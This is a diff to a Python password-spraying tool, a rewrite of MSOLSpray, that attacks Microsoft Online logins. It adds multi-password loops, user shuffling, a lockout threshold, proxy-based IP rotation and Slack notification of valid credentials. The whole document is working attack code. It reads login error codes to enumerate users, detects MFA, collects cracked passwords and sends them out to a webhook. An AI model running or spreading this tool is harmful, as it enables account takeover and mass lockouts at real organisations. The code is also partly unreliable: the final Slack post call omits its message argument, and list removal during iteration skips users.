@@ -1,6 +1,9 @@
+#!/usr/bin/env python3
 import requests
 import argparse
 import time
+from math import trunc
+from random import shuffle
 
 description = """
 This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!
@@ -17,15 +20,130 @@ This command uses the specified FireProx URL to spray from randomized IP address
     python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
 """
 
-parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
+# Colorized output during run
+class text_colors:
+    red = "\033[91m"
+    green = "\033[92m"
+    yellow = "\033[93m"
+    reset = "\033[0m"
 
-parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
-parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
-parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
-parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
-parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
-parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
-parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many seconds between tries")
+
+# Class for slack webhook
+class SlackWebhook:
+    def __init__(self, webhook_url):
+        self.webhook_url = webhook_url
+
+    # Post a simple update to slack
+    def post(self, text):
+        block = f"```\n{text}\n```"
+        payload = {
+            "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": block}}]
+        }
+        status = self.__post_payload(payload)
+        return status
+
+    # Post a json payload to slack webhook URL
+    def __post_payload(self, payload):
+        response = requests.post(self.webhook_url, json=payload)
+        if response.status_code != 200:
+            print(
+                "%s[Error] %s%s"
+                % (
+                    text_colors.red,
+                    "Could not send notification to Slack",
+                    text_colors.reset,
+                )
+            )
+
+
+def get_list_from_file(file_):
+    with open(file_, "r") as f:
+        list_ = [line.strip() for line in f]
+    return list_
+
+
+parser = argparse.ArgumentParser(
+    description=description,
+    epilog=epilog,
+    formatter_class=argparse.RawDescriptionHelpFormatter,
+)
+
+group_user = parser.add_mutually_exclusive_group(required=True)
+group_user.add_argument("-u", "--username", type=str, help="Single username")
+group_user.add_argument(
+    "-U",
+    "--usernames",
+    type=str,
+    metavar="FILE",
+    help="File containing usernames in the format 'user@domain'.",
+)
+group_password = parser.add_mutually_exclusive_group(required=True)
+group_password.add_argument("-p", "--password", type=str, help="Single password.")
+group_password.add_argument(
+    "-P",
+    "--passwords",
+    type=str,
+    help="File containing passwords, one per line.",
+    metavar="FILE",
+)
+parser.add_argument(
+    "-o",
+    "--out",
+    metavar="OUTFILE",
+    default="valid_creds.txt",
+    help="A file to output valid results to. (default: %(default)s)",
+)
+parser.add_argument(
+    "--url",
+    default="https://login.microsoft.com",
+    help="The URL to spray against (default: %(default)s). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.",
+)
+parser.add_argument(
+    "-f",
+    "--force",
+    action="store_true",
+    help="Forces the spray to continue and not stop when multiple account lockouts are detected.",
+)
+parser.add_argument(
+    "--shuffle",
+    action="store_true",
+    help="Shuffle user list",
+)
+parser.add_argument(
+    "--slack",
+    type=str,
+    help="Slack webhook for sending notifications (default: %(default)s)",
+    default=None,
+    required=False,
+)
+parser.add_argument(
+    "-s",
+    "--sleep",
+    default=0,
+    type=int,
+    help="Sleep this many seconds between tries (default: %(default)s)",
+)
+parser.add_argument(
+    "--pause",
+    default=15,
+    type=float,
+    help="Pause (in minutes) between each iteration (default: %(default)s)",
+)
+parser.add_argument(
+    "-l",
+    "--max-lockout",
+    default=10,
+    metavar="PERCENT",
+    type=int,
+    dest="max_lockout",
+    help="Maximum lockouts (in percent) to be observed before ask to abort execution. (default: %(default)s)",
+)
+parser.add_argument(
+    "-v",
+    "--verbose",
+    action="store_true",
+    help="Prints usernames that could exist in case of invalid password",
+)
 
 args = parser.parse_args()
 
@@ -33,12 +151,14 @@ password = args.password
 url = args.url
 force = args.force
 out = args.out
+slack = args.slack
 verbose = args.verbose
+must_shuffle = args.shuffle
 sleep = args.sleep
+pause = args.pause * 60
 
-usernames = []
-with open(args.userlist, "r") as userlist:
-    usernames = userlist.read().splitlines()
+usernames = [args.username] if args.username else get_list_from_file(args.usernames)
+passwords = [args.password] if args.password else get_list_from_file(args.passwords)
 
 username_count = len(usernames)
 
@@ -47,101 +167,150 @@ print("Now spraying Microsoft Online.")
 print(f"Current date and time: {time.ctime()}")
 
 results = ""
-username_counter = 0
+results_list = []
 lockout_counter = 0
 lockout_question = False
-for username in usernames:
+lockout_max = trunc((args.max_lockout / 100) * username_count)
 
-    if username_counter>0 and sleep>0:        
-        time.sleep(sleep)
-        
-    username_counter += 1
-    print(f"{username_counter} of {username_count} users tested", end="\r")
+for pindex, password in enumerate(passwords):
+    if pindex > 0 and pause > 0:
+        print(f"[-] Sleeping {pause/60} minutes until next iteration")
+        time.sleep(pause)
+    print(f"[*] Spraying password: {password}")
+    username_counter = 0
+    username_count = len(usernames)
+    if must_shuffle:
+        shuffle(usernames)
+    for uindex, username in enumerate(usernames):
+        if username_counter > 0 and sleep > 0:
+            time.sleep(sleep)
 
-    body = {
-        'resource': 'https://graph.windows.net',
-        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
-        'client_info': '1',
-        'grant_type': 'password',
-        'username': username,
-        'password': password,
-        'scope': 'openid',
-    }
+        username_counter += 1
+        print(f"{username_counter} of {username_count} users tested", end="\r")
 
-    headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/x-www-form-urlencoded',
-    }
+        body = {
+            "resource": "https://graph.windows.net",
+            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
+            "client_info": "1",
+            "grant_type": "password",
+            "username": username,
+            "password": password,
+            "scope": "openid",
+        }
 
-    r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/x-www-form-urlencoded",
+        }
 
-    if r.status_code == 200:
-        print(f"SUCCESS! {username} : {password}")
-        results += f"{username} : {password}\n"
-    else:
-        resp = r.json()
-        error = resp["error_description"]
+        r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
 
-        if "AADSTS50126" in error:
-            if verbose:
-                print(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
-            continue
-
-        elif "AADSTS50128" in error or "AADSTS50059" in error:
-            print(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
-
-        elif "AADSTS50034" in error:
-            print(f"WARNING! The user {username} doesn't exist.")
-
-        elif "AADSTS50079" in error or "AADSTS50076" in error:
-            # Microsoft MFA response
-            print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
+        if r.status_code == 200:
+            print(
+                f"{text_colors.green}SUCCESS! {username} : {password}{text_colors.reset}"
+            )
             results += f"{username} : {password}\n"
-
-        elif "AADSTS50158" in error:
-            # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
-            print(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
-            results += f"{username} : {password}\n"
-
-        elif "AADSTS50053" in error:
-            # Locked out account or Smart Lockout in place
-            print(f"WARNING! The account {username} appears to be locked.")
-            lockout_counter += 1
-
-        elif "AADSTS50057" in error:
-            # Disabled account
-            print(f"WARNING! The account {username} appears to be disabled.")
-
-        elif "AADSTS50055" in error:
-            # User password is expired
-            print(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
-            results += f"{username} : {password}\n"
-
+            results_list.append(f"{username}:{password}")
+            usernames.remove(username)
         else:
-            # Unknown errors
-            print(f"Got an error we haven't seen yet for user {username}")
-            print(error)
+            resp = r.json()
+            error = resp["error_description"]
 
+            if "AADSTS50126" in error:
+                if verbose:
+                    print(
+                        f"VERBOSE: Invalid username or password. Username: {username} could exist."
+                    )
+                continue
 
-    # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
-    if not force and lockout_counter == 10 and lockout_question == False:
-        print("WARNING! Multiple Account Lockouts Detected!")
-        print("10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?")
-        yes = {'yes', 'y'}
-        no = {'no', 'n', ''}
-        lockout_question = True
-        choice = "X"
-        while(choice not in no and choice not in yes):
-            choice = input("[Y/N] (default is N): ").lower()
+            elif "AADSTS50128" in error or "AADSTS50059" in error:
+                print(
+                    f"{text_colors.yellow}WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.{text_colors.reset}"
+                )
 
-        if choice in no:
-            print("Cancelling the password spray.")
-            print("NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.")
-            break
+            elif "AADSTS50034" in error:
+                print(
+                    f"{text_colors.yellow}WARNING! The user {username} doesn't exist.{text_colors.reset}"
+                )
+                usernames.remove(username)
 
-        # else: continue even though lockout is detected
+            elif "AADSTS50079" in error or "AADSTS50076" in error:
+                # Microsoft MFA response
+                print(
+                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.{text_colors.reset}"
+                )
+                results += f"{username} : {password}\n"
+                results_list.append(f"{username}:{password}")
+                usernames.remove(username)
 
-if out and results != "":
-    with open(out, 'w') as out_file:
-        out_file.write(results)
+            elif "AADSTS50158" in error:
+                # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
+                print(
+                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.{text_colors.reset}"
+                )
+                results += f"{username} : {password}\n"
+                results_list.append(f"{username}:{password}")
+                usernames.remove(username)
+
+            elif "AADSTS50053" in error:
+                # Locked out account or Smart Lockout in place
+                print(
+                    f"{text_colors.yellow}WARNING! The account {username} appears to be locked.{text_colors.reset}"
+                )
+                lockout_counter += 1
+
+            elif "AADSTS50057" in error:
+                # Disabled account
+                print(
+                    f"{text_colors.yellow}WARNING! The account {username} appears to be disabled.{text_colors.reset}"
+                )
+
+            elif "AADSTS50055" in error:
+                # User password is expired
+                print(
+                    f"{text_colors.green}SUCCESS! {username} : {password} - NOTE: The user's password is expired.{text_colors.reset}"
+                )
+                results += f"{username} : {password}\n"
+                results_list.append(f"{username}:{password}")
+                usernames.remove(username)
+
+            else:
+                # Unknown errors
+                print(f"Got an error we haven't seen yet for user {username}")
+                print(error)
+
+        # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
+        if not force and lockout_counter >= lockout_max and lockout_question == False:
+            print(
+                f"{text_colors.red}WARNING! Multiple Account Lockouts Detected!{text_colors.reset}"
+            )
+            print(
+                f"{lockout_counter} of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
+            )
+            yes = {"yes", "y"}
+            no = {"no", "n", ""}
+            lockout_question = True
+            choice = "X"
+            while choice not in no and choice not in yes:
+                choice = input("[Y/N] (default is N): ").lower()
+
+            if choice in no:
+                print("Cancelling the password spray.")
+                print(
+                    "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
+                )
+                break
+
+            # else: continue even though lockout is detected
+
+    if results != "":
+        with open(out, "a") as out_file:
+            out_file.write(results)
         print(f"Results have been written to {out}.")
+        if slack:
+            webhook = SlackWebhook(slack)
+            msg = "Found valid credentials! (-.^)\n\n"
+            msg += "\n".join(results_list)
+            webhook.post()
+        results = ""
+        results_list.clear()
